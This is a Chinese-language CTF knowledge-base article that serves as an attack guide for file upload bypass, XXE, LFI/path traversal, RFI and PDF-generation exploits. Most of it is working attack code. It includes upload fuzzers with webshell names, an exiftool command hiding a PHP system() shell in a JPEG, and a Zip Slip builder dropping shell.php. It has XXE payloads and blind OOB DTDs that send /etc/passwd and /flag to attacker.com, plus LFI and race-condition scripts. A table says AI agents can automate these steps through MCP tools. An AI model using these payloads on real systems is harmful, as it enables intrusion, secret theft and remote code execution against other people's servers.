---
id: "ctf-website/06-file-attacks/file-upload-xxe-lfi"
title: "File Upload / XXE / LFI / Path Traversal"
title_en: "File Upload / XXE / LFI / Path Traversal"
summary: >
  文件攻击四大类完整指南：文件上传绕过（扩展名双写、MIME伪造、图片马、Zip Slip路径穿越）、XXE漏洞利用（文件读取、内网SSRF、Blind XXE OOB外带、SVG/Office文件场景）、LFI路径穿越（编码绕过、PHP wrapper全集、Session Upload Progress竞态包含），以及PDF生成RCE和Node.js路径穿越特有手法。
summary_en: >
  Complete guide to four major file attack categories: file upload bypass (double extensions, MIME spoofing, polyglot images, Zip Slip), XXE exploitation (file read, internal SSRF, blind OOB exfiltration, SVG/Office scenarios), LFI path traversal (encoding bypass, PHP wrappers, session upload progress race condition), plus PDF generation RCE and Node.js path traversal techniques.
board: "ctf-website"
category: "06-file-attacks"
signals: ["file upload", "XXE", "LFI", "path traversal", "文件上传", "路径穿越", "PHP wrapper", "盲XXE"]
mcp_tools: ["http_probe", "kb_router"]
keywords: ["文件上传绕过", "XXE", "LFI", "路径穿越", "PHP wrapper", "文件包含", "Zip Slip", "Blind XXE", "Session Upload Progress", "PDF生成RCE"]
difficulty: "advanced"
tags: ["file-upload", "xxe", "lfi", "path-traversal", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/04-ssrf/ssrf", "ctf-website/03-injection/ssti", "ctf-website/24-database/04-config-exposure", "ctf-website/24-database/05-backup-log-leak", "ctf-website/12-payment/platform-fingerprints", "ctf-website/12-payment/payment-callback-async"]
---
# File Upload / XXE / LFI / Path Traversal

## 0. 文件入口到运行时/配置/支付链

文件攻击不要按“上传成功”结束，要判断文件最终进入了哪个运行时：Web server、图片处理器、XML parser、压缩解包器、PDF 渲染器、模板引擎、对象存储或后台导出。每个运行时对应不同下一跳。

| 入口 | 关键证据 | 第一动作 | 下一跳 |
|---|---|---|---|
| 上传头像/附件 | 保存路径、访问 URL、Content-Type | filename/MIME/魔数差分 | Web server 解析、PHAR |
| XML/SVG/Office | XML parser 报错、OOB 请求 | 外部实体、参数实体、DTD | SSRF、文件读 |
| 下载/预览 | `file/path/url/key` 参数 | 路径穿越、wrapper、对象存储 key | LFI、配置泄露 |
| Zip/导入包 | 文件列表和落地路径差异 | local header/central dir 错位 | Zip Slip、覆盖配置 |
| PDF/截图 | headless/wkhtmltopdf 指纹 | `file://`, redirect, JS 读文件 | 本地文件、SSRF |
| 支付附件/发票 | invoice/order/export 文件 | 跨订单下载、导出路径 | 支付 IDOR、账本泄露 |
| 配置/日志 | `.env`, `database.php`, `runtime.log` | 抽 DB/Redis/queue/secret | 数据库、回调签名 |

文件链路路由器：

```python
# file_attack_route_matrix.py
import csv
import hashlib
import re
from pathlib import Path

ROUTES = {
    "database_config": re.compile(r"(DB_HOST|DB_PASSWORD|DATABASE_URL|redis|mysql|postgres|mongodb)", re.I),
    "payment_secret": re.compile(r"(pay_secret|webhook_secret|notify_url|out_trade_no|stripe|epay|alipay|wechat)", re.I),
    "php_runtime": re.compile(r"(<\\?php|phar://|session.upload_progress|open_basedir)", re.I),
    "cloud_secret": re.compile(r"(AWS_ACCESS_KEY|AKIA|GOOGLE_APPLICATION_CREDENTIALS|AZURE_CLIENT)", re.I),
    "flag": re.compile(r"(flag\\{|CTF\\{|DASCTF\\{)", re.I),
}

def classify_text(name, data):
    text = data.decode("utf-8", "ignore")
    hits = [route for route, rx in ROUTES.items() if rx.search(text)]
    return {
        "file": name,
        "size": len(data),
        "sha1": hashlib.sha1(data[:4096]).hexdigest()[:12],
        "routes": ",".join(hits),
        "sample": text[:180].replace("\n", "\\n"),
    }

def classify_exports(root="exports/file_leaks", out="exports/file_attack_route_matrix.csv"):
    rows = []
    for path in Path(root).rglob("*"):
        if path.is_file():
            rows.append(classify_text(str(path), path.read_bytes()))
    Path(out).parent.mkdir(parents=True, exist_ok=True)
    with open(out, "w", newline="", encoding="utf-8") as f:
        fieldnames = ["file", "size", "sha1", "routes", "sample"]
        w = csv.DictWriter(f, fieldnames=fieldnames)
        w.writeheader()
        w.writerows(rows)
    return rows
```

执行节奏：

1. 先确认入口运行时：上传保存、下载读取、XML 解析、PDF 渲染、压缩解包还是对象存储代理。
2. 所有命中文件统一放进 `exports/file_leaks/`，跑 `file_attack_route_matrix.py` 分类。
3. 命中数据库配置后立刻转数据库配置/备份文档，抽连接串和表前缀。
4. 命中 `pay_secret/notify_url/out_trade_no` 后转支付回调文档，构造签名和状态差分。
5. 命中 SSRF/OOB 时回到 SSRF 文档，按 metadata、数据库端口、内部 API 继续分流。

## 1. 文件上传绕过

### 扩展名绕过字典

```python
# 通用双扩展名 + MIME 组合 fuzz
EXT_BYPASS = [
    # 双扩展名
    "shell.php.jpg", "shell.jpg.php", "shell.php.jpeg",
    "shell.php%00.jpg", "shell.php%0d%0a.jpg",
    "shell.pHP", "shell.PHP", "shell.Php",
    # 特殊扩展名
    "shell.phtml", "shell.pht", "shell.php5", "shell.php7",
    "shell.phar", "shell.shtml", "shell.inc",
    # .htaccess 覆盖
    ".htaccess",  # AddType application/x-httpd-php .jpg
    # ASP/ASPX
    "shell.asp;.jpg", "shell.aspx;.jpg",
    "shell.cer", "shell.asa", "shell.cshtml",
    # JSP
    "shell.jsp;.jpg", "shell.jspx",
]

# 上传模板
def upload_bypass(target_url: str, file_content: bytes, filename: str):
    """自动尝试各种扩展名绕过"""
    import requests
    for ext in EXT_BYPASS:
        files = {"file": (ext, file_content, "image/jpeg")}
        r = requests.post(target_url, files=files)
        location = r.headers.get("Location", "") or r.text
        if "success" in location.lower() or r.status_code == 200:
            print(f"  [!] {ext} → OK")
```

### Content-Type 绕过

```python
MIME_BYPASS = [
    "image/jpeg", "image/png", "image/gif",
    "text/plain", "application/octet-stream",
    "application/x-php", "", None,
]
```

### 解析器差异与文件名规范化

上传链路通常是：浏览器 multipart → 反向代理 → Web 框架 multipart parser → 后端校验 → 存储层 → Web server 执行/下载。每一层对 filename、Content-Type、魔数、扩展名的理解都可能不同。

| 位置 | 变体 | 目标差异 |
|---|---|---|
| 扩展名 | `a.php.jpg`, `a.jpg.php`, `a.pht`, `a.phar` | 黑名单/白名单取第一个或最后一个后缀 |
| 大小写 | `a.pHP`, `a.PhP5` | Linux 区分大小写，校验器 lower 漏掉 |
| 空白/点 | `a.php.`, `a.php `, `a.php%20` | Windows/某些存储层截断尾部 |
| 分号 | `a.asp;.jpg`, `a.jsp;.png` | IIS/Tomcat 历史解析差异 |
| Null byte | `a.php%00.jpg` | 老 PHP/C 扩展字符串截断 |
| Unicode | `a.pｈp`, `a.php%ef%bc%8ejpg` | normalize 前后后缀不同 |
| 路径 | `../shell.php`, `..%2fshell.php` | 存储 key 与文件系统路径混淆 |
| 多 part | 同名 `file` 两次 | 校验第一份、保存第二份 |

文件名生成器：

```python
def filename_variants(base="avatar", exts=("php", "phtml", "phar"), cover=("jpg", "png")):
    for e in exts:
        yield f"{base}.{e}"
        yield f"{base}.{e}.{cover[0]}"
        yield f"{base}.{cover[0]}.{e}"
        yield f"{base}.{e.upper()}"
        yield f"{base}.{e}."
        yield f"{base}.{e} "
        yield f"{base}.{e}%00.{cover[0]}"
        yield f"{base}.{e}%0d%0a.{cover[0]}"
        yield f"../{base}.{e}"
        yield f"..%2f{base}.{e}"

for name in filename_variants():
    print(name)
```

命中判断不要只看“上传成功”：还要记录最终访问路径、下载时 `Content-Type`、是否被 Web server 当脚本执行、图片处理后 payload 是否保留。

### 图片马 (Polyglot)

```bash
# PHP shell in JPEG EXIF
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg -o shell.jpg
# PHP shell in PNG IDAT (保留有效图片)
# 用工具: php_jpeg_shell.php, png_polyglot.py
```

### Zip Slip

```python
import zipfile, io

# 构造包含路径穿越的 zip
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    # 正常文件
    zf.writestr("innocent.txt", "hello")
    # 路径穿越 — 解压时可能覆盖敏感文件或写 shell
    zf.writestr("../../var/www/html/shell.php", '<?php system($_GET["c"]); ?>')
    zf.writestr("..\\..\\inetpub\\wwwroot\\shell.aspx", "<%@ Page Language='C#'%><%System.Diagnostics.Process.Start('cmd.exe','/c whoami');%>")

with open("zip_slip.zip", "wb") as f:
    f.write(buf.getvalue())
```

### Zip 中央目录 / Local Header 错位

有些解压库校验 central directory 的文件名，但真正解压时使用 local file header；也有些业务先读取 zip 列表展示，再把原始 zip 交给另一个组件解压。CTF 里可以用“显示名正常、落地名穿越”打解析差异。

```python
import io
import zipfile

def make_zip_name_mismatch(display_name="safe_upload_placeholder.txt", real_name="../../web/shell.php"):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(display_name, "<?php echo 'CTF'; ?>")
    data = bytearray(buf.getvalue())
    old = display_name.encode()
    new = real_name.encode()
    if len(new) > len(old):
        raise ValueError("real_name must be <= display_name length for in-place patch")
    patched = new + b"\x00" * (len(old) - len(new))
    # 只替换第一个 local header 文件名，保留 central directory 显示名
    idx = data.find(old)
    data[idx:idx + len(old)] = patched
    return bytes(data)
```

如果目标 zip 列表显示 `image.txt`，但解压日志或访问路径出现 `shell.php`，说明两个解析器发生了分歧。

## 2. XXE (XML External Entity)

```xml
<!-- Probe 1: 文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY file SYSTEM "file:///etc/passwd">]>
<root><data>&file;</data></root>

<!-- Probe 2: 内网 SSRF -->
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&ssrf;</data></root>

<!-- Probe 3: Blind XXE (out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval SYSTEM "http://attacker.com/evil.dtd">
  %eval;
]>
<root><data>test</data></root>

<!-- evil.dtd (托管在 attacker.com) -->
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?%file;'>">
%all;

<!-- Probe 4: 通过参数实体 -->
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root><data>&exfil;</data></root>

<!-- Probe 5: SVG (图片上传场景) -->
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="file:///etc/hostname" width="100" height="100"/>
</svg>

<!-- Probe 6: DOCX/XLSX (Office 文件上传场景) -->
<!-- 修改 .docx 内 /word/document.xml 加入 XXE entity -->
```

### XXE 变种

```python
# 不同协议和编码的 Payload
XXE_PAYLOADS = [
    # 基础文件读取
    'file:///etc/passwd',
    'file:///c:/windows/win.ini',
    # PHP wrapper
    'php://filter/convert.base64-encode/resource=/var/www/html/config.php',
    'php://filter/read=convert.base64-encode/resource=index.php',
    # jar (Java)
    'jar:file:///var/www/webapp.war!/WEB-INF/web.xml',
    # netdoc (Java)
    'netdoc:///etc/passwd',
    # expect (RCE if enabled)
    'expect://id',
    # LDAP
    'ldap://attacker.com/evil',
]
```

### XXE 解析器边界

| 解析器/场景 | 打点 payload | 命中信号 | 常见卡点 |
|---|---|---|---|
| Java SAX/DOM | 外部 DTD + 参数实体 | 回显文件或 OOB 请求 | `disallow-doctype-decl` |
| PHP libxml | `php://filter` | base64 源码 | `LIBXML_NONET` 禁网络 |
| .NET XmlDocument | `file:///c:/windows/win.ini` | Windows ini 内容 | 默认 resolver 为空 |
| SVG 上传 | `<image href="file://...">` | 转换后图片/PDF 带内容 | 图片库不加载外部资源 |
| Office 文档 | `word/document.xml` 实体 | 解析转换时报错/外带 | 只解压不解析 XML |

Blind XXE 优先用参数实体；普通实体 `&file;` 没回显时，不代表失败，可能只是渲染层不输出该节点。

## 3. LFI / Path Traversal

```python
# LFI fuzz 脚本
import requests, urllib.parse

LFI_PAYLOADS = [
    # 直接路径穿越
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",   # 过滤 ../ 的绕过
    "..././..././..././..././etc/passwd",  # 另一种绕过
    # Null byte (PHP < 5.3)
    "../../../../../../etc/passwd%00",
    "../../../../../../etc/passwd%00.jpg",
    # 编码绕过
    "..%2f..%2f..%2f..%2fetc%2fpasswd",   # URL 编码
    "..%252f..%252f..%252f..%252fetc%252fpasswd", # 双编码
    # 绝对路径
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    # PHP wrapper
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
    "php://input",                        # POST body 当 PHP code
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    "phar://uploads/shell.jpg/shell",
    # 日志污染 → LFI
    "../../../../../../var/log/apache2/access.log",
    "../../../../../../proc/self/environ",
    # Windows
    "../../../../../../windows/win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
]

def fuzz_lfi(target: str, param: str = "file"):
    for payload in LFI_PAYLOADS:
        # GET
        r = requests.get(target, params={param: payload})
        if any(kw in r.text for kw in ["root:", "daemon:", "[extensions]", "<?php", "WIN.INI"]):
            print(f"[!] {payload[:50]} → HIT")
        # POST
        r = requests.post(target, data={param: payload})
        if any(kw in r.text for kw in ["root:", "daemon:", "[extensions]"]):
            print(f"[!] POST {payload[:50]} → HIT")
```

### /proc 利用 (Linux)

```bash
/proc/self/environ          # 环境变量 (可能含密钥)
/proc/self/fd/0             # stdin → 可污染
/proc/self/fd/1             # stdout
/proc/self/fd/7             # 某文件句柄
/proc/self/cmdline          # 启动命令
/proc/self/maps             # 内存映射
/proc/self/status           # 进程信息
/proc/sys/kernel/random/boot_id  # 可预测值
```

### Wrapper 选择矩阵

| 目标 | 首选 wrapper/path | 成功标志 | 失败样本 |
|---|---|---|---|
| 读 PHP 源码 | `php://filter/convert.base64-encode/resource=index.php` | base64 后解出 PHP | 返回空白，多半 path 错 |
| 包含 POST body | `php://input` | POST 里的 PHP 被执行 | body 原样输出或 500 |
| 包含 data URI | `data://text/plain;base64,...` | 输出命令结果 | `allow_url_include` 关闭 |
| 触发 PHAR | `phar://uploads/a.jpg/x` | 反序列化 gadget 触发 | 只是读取 zip 内容 |
| 读压缩包 | `zip://uploads/a.zip%23x.php` | 执行/显示 zip 内文件 | `#` 未编码成 `%23` |
| 日志污染 | `/var/log/nginx/access.log` | User-Agent 代码进入日志 | 日志路径/权限不对 |
| 临时文件 | `/proc/self/fd/N` | 读到上传临时内容 | fd 生命周期太短 |

路径被拼接后缀时，优先测：

```text
php://filter/convert.base64-encode/resource=index
php://filter/convert.base64-encode/resource=index.php%00
zip://uploads/a.zip%23x
phar://uploads/a.jpg/x
....//....//....//etc/passwd
```

### Session 文件包含

```python
# 如果 PHP session.upload_progress 开启:
# 1. 上传文件的同时，PHP 会把上传进度写入 session 文件
# 2. session 文件中包含我们控制的 filename
# 3. LFI 包含这个 session 文件 → filename 中的 PHP 代码被执行

import threading, requests

def race_session_lfi(target_url: str, lfi_param: str, php_code: str):
    """Session Upload Progress → LFI race"""
    sess = requests.Session()

    def upload_with_race():
        # 上传文件，同时设置 PHP_SESSION_UPLOAD_PROGRESS
        files = {"file": ("a.txt", "a" * 10000)}
        data = {"PHP_SESSION_UPLOAD_PROGRESS": f"<?php {php_code} ?>"}
        # 故意用慢速上传，延长窗口
        sess.post(target_url + "/upload.php", files=files, data=data)

    def lfi_race():
        # 同时尝试包含 session 文件
        while True:
            r = sess.get(target_url + "/index.php", params={
                lfi_param: "/tmp/sess_" + sess.cookies.get("PHPSESSID")
            })
            if php_code.strip("<?php >") in r.text:
                print(f"[!] RACE WON! Command output: {r.text}")
                break

    threading.Thread(target=upload_with_race).start()
    threading.Thread(target=lfi_race).start()
```

---

## 4. PHP Wrapper 全集

```python
PHP_WRAPPERS = [
    # 文件读取
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=/flag",
    "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",  # 绕过过滤
    "php://filter/zlib.deflate/resource=index.php",
    # RCE
    "php://input",                           # POST body = PHP code
    "data://text/plain,<?php system('id');?>",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
    "expect://id",                           # 需要 expect 扩展
    # PHAR 反序列化
    "phar://uploads/avatar.jpg/shell",       # phar 文件内嵌序列化对象
    # 压缩流
    "zip://uploads/archive.zip%23shell.php",
    "compress.zlib://uploads/shell.gz",
    "compress.bzip2://uploads/shell.bz2",
]
```

### PHAR 触发点

PHAR 不一定要 `include` 才触发；只要 PHP 对 `phar://` 路径做文件元数据操作，就可能反序列化 metadata。

| 函数/场景 | 触发方式 |
|---|---|
| `file_exists()` | `file_exists("phar://uploads/a.jpg/x")` |
| `is_file()` / `is_dir()` | 路径检查时触发 |
| `getimagesize()` | 图片校验读取路径 |
| `exif_read_data()` | EXIF 解析 |
| `unlink()` | 删除上传文件 |
| `copy()` / `rename()` | 文件管理功能 |

CTF 打法：先确认上传文件不会被重编码；再确认目标功能会对可控路径调用文件函数；最后把 `phar://` 包到 LFI、头像裁剪、删除附件、图片信息读取等入口里。

## 5. RFI (Remote File Inclusion)

```php
# 需要 allow_url_include=On (PHP < 7.4)
# → include('http://attacker.com/shell.txt')
# → shell.txt 中的 PHP 代码被执行

# 探测:
# ?file=http://attacker.com/test.txt
# 若 attacker.com 收到请求 → RFI 可行
```

## 6. Node.js Path Traversal Poison

```python
# Node.js 路径穿越特有手法
# 1. 编码绕过
"/../../../../../../etc/passwd"
"..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
"/..;/..;/..;/..;/..;/etc/passwd"          # Spring/Tomcat

# 2. Unicode 绕过
"/..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"
"/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"  # 全角斜线

# 3. 符号链接绕过
"/proc/self/root/../../etc/passwd"

# 4. 路径截断
"../../../../../../etc/passwd%00"
"../../../../../../etc/passwd%00.jpg"
```

## 7. XXE OOB 完整版

```xml
<!-- Blind XXE — 外带数据到攻击者服务器 -->

<!-- evil.dtd (托管在 attacker.com) -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;

<!-- 发送的 payload -->
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfil;</root>
```

## 8. 攻击链

```
文件上传 → 双扩展名绕过 → webshell → RCE → flag
文件上传 → Zip Slip → 覆盖 authorized_keys → SSH 登录
文件上传 → SVG XXE → 文件读取 → /etc/passwd + shadow
XXE Out-of-Band → 文件外带 → /flag → base64 DNS 分段传出
LFI → /proc/self/environ → 环境变量泄露 → API key/DB 密码
LFI → php://input → POST body 执行 → RCE
LFI → Session Upload Progress → 竞态包含 → PHP 代码执行
LFI → 日志污染 → User-Agent <?php ?> → access.log 包含 → RCE
RFI → 远程包含 → attacker.com/shell.txt → RCE
XXE → SSRF → 内网探测 → 内部 Admin Panel
文件上传 → .htaccess → AddType 覆盖 → 任意扩展名被执行
LFI → proc/self/fd → 文件句柄泄露 → 读取临时上传文件
```

## 9. 工具引用

```bash
# ffuf — LFI fuzzing
ffuf -u "https://target.com/index.php?file=FUZZ" \
  -w /wordlists/lfi.txt -mr "root:" -t 50

# nuclei — 模板扫描
nuclei -u https://target.com -t file/upload-xxe-lfi/ -o findings.json

# 手动 curl 批量
while read path; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com?file=$path")
  echo "$code $path"
done < lfi_wordlist.txt
```

## 10. PDF Generation RCE

### wkhtmltopdf — redirect to file://

```python
# wkhtmltopdf 跟随 HTTP redirect
# → 攻击者的 web server 返回 302 → file:///etc/passwd
# → PDF 包含 /etc/passwd 内容
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/malicious.html')
def redirect_to_file():
    return redirect('file:///etc/passwd', code=302)

# 目标: /generate-pdf?url=https://attacker.com/malicious.html
# PDF 输出 → 下载 → 看到 /etc/passwd
```

### wkhtmltopdf XSS → file:// EXFIL

```javascript
// wkhtmltopdf 默认启用 JavaScript (QtWebKit)
// HTML 页面中注入的 XSS 可以读本地文件:
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///flag', false);
xhr.send();
document.body.innerText = xhr.responseText;
// PDF 渲染后 → 页面包含 flag 内容
</script>
```

### Puppeteer / Headless Chrome PDF

```javascript
// 如果 puppeteer 运行在沙箱内 → 读 /etc/hostname 等
// 如果 --no-sandbox → 完整 RCE 可能
await page.goto('file:///etc/passwd');
await page.pdf({path: 'output.pdf'});
// output.pdf 中包含 passwd 内容
```

### wicked_pdf ERB Injection

```ruby
# Rails wicked_pdf gem 在 PDF 生成前处理 ERB
# 注入: <%= `cat /flag` %>
# → ERB 渲染时执行 → RCE
```

## Evidence

记录: multipart 原始请求、filename/MIME/魔数、保存路径、访问路径、Web server 解析结果、XXE 实体 payload、LFI 命中文件前 200 字节、wrapper 类型、callback IP/时间、配置/支付字段分类、失败样本。

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 文件上传/XXE/LFI 端点探测 | `http_probe` | HTTP GET 探测文件操作入口点 |
| 知识检索 | `kb_router` | 按文件攻击信号搜索知识库 |
| 读取关联文档 | `kb_read_file` | 跳 SSRF、数据库配置、支付回调、SSTI |
| 执行脚本 | `run_ctf_tool` | 跑 filename fuzz、XXE OOB、LFI wordlist 和泄露分类 |
